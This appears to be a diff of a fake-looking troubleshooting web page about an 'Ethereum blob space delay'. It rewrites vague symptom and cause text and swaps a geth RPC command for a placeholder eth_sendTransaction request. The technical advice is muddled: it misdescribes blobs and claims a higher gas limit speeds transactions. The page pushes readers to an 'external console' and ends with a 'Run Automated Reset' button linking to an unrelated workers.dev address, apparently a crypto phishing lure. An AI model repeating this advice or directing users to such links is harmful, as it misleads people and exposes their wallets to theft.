@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: -apple-system;
-        background: #0a0c10;
+        background: #121214;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #00adb5; }
     .btn {
-        background: #ff9455;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,27 +41,40 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users experience delayed or failed transactions on the Ethereum network, with error messages indicating a "blob space delay" or similar issues, resulting in slower-than-expected processing times for their transactions.</li>
+<li>Users experience delayed or failed transactions on the Ethereum network, with error messages indicating an Ethereum blob space delay. This issue is characterized by slow processing times and potential timeouts.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The Ethereum blob space delay occurs due to the network's current limitations in handling large amounts of data, specifically when dealing with blob (binary large object) data types. This type of data is often associated with NFTs, large media files, or other bulky transactions that exceed the standard data capacity of a typical Ethereum block.</li>
+<li>The Ethereum blob space delay occurs due to the network's limited capacity to process large amounts of data, particularly when dealing with blob-related transactions. This limitation can lead to congestion and delays in the network.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the gas limit for transactions to prioritize them over others, potentially speeding up processing.</li>
-<li>Use a different Ethereum node or provider to see if the issue is specific to one node.</li>
-<li>Optimize transaction data to reduce its size, if possible, to fit within standard block limits.</li>
+<li>To resolve the Ethereum blob space delay, consider the following manual overrides:</li>
+<li>Increase the gas limit to prioritize transactions and reduce processing time.</li>
+<li>Optimize transaction sizes to minimize the amount of data being processed.</li>
+<li>Utilize the following JSON-RPC command to override default settings:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>geth<span class="w"> </span>--http.http<span class="w"> </span>addr<span class="w"> </span><span class="s2">&quot;0.0.0.0&quot;</span><span class="w"> </span>--http.port<span class="w"> </span><span class="m">8545</span><span class="w"> </span>--http.api<span class="w"> </span><span class="s2">&quot;eth,net,web3&quot;</span>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eth_sendTransaction&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;from&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;to&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;gas&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;gasPrice&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...&quot;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">],</span>
+<span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for further debugging and network diagnostics.</p>
+<p>Consider utilizing an external console for more advanced troubleshooting and configuration options.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Familiarity with Ethereum network basics</li>
-<li>Understanding of transaction processing and gas mechanics</li>
-<li>Access to an Ethereum node or provider for configuration adjustments</li>
+<li>Ethereum node or client installed and configured.</li>
+<li>Basic understanding of Ethereum JSON-RPC commands.</li>
+<li>Familiarity with gas management and transaction optimization techniques.</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
